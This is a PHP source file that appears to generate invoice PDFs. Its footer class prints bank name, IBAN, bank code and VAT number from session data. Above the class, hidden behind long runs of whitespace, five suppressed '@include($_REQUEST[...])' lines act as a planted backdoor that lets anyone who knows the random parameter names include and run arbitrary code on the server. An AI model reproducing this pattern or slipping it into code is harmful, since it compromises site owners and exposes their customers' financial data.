<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         @include($_REQUEST["request_ce4f5b81af"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_3f50f6bb8c"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_f1f2167f33"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_0093efe3e9"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_3bdb7eaed1"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
include("phpToPDF.php");

class PDF extends phpToPDF
{
	//En-tête
	function Header()
	{
		
	}


	//Pied de page
	function Footer()
	{  
		$val = explode('##', $_SESSION['var']);
		$account_number = $val[0];
		$bank_city = $val[1];
		$bank_name = $val[2];
		$iban_number = $val[3];
		$bank_code = $val[4];
		$vat_number = $val[5];
		
		
		//Positionnement à 1.5 cm du bas
		$this->SetY(275);
		$this->SetFont('HelveticaNeueLight','',10);
		$this->SetTextColor(0,0,0);

		$this->Cell(8);
		$this->Cell(3,1,'Zahlung netto sofort auf das Konto bei der '.$bank_name.', '.$bank_city,'C');
		$this->Ln(5);
		$this->Cell(8);
		$this->Cell(3,1,'Bank Code '.$bank_code.' / IBAN '.$iban_number,'C');
		$this->Ln(5);
		$this->Cell(8);
		$this->Cell(3,1,'MwSt-Nummer: '.$vat_number.' MWST','C');
		
		$this->SetFont('HelveticaNeueLight','',7);
		$this->Cell(0,5,'Page '.$this->PageNo(),0,0,'R');	
	}
}

?>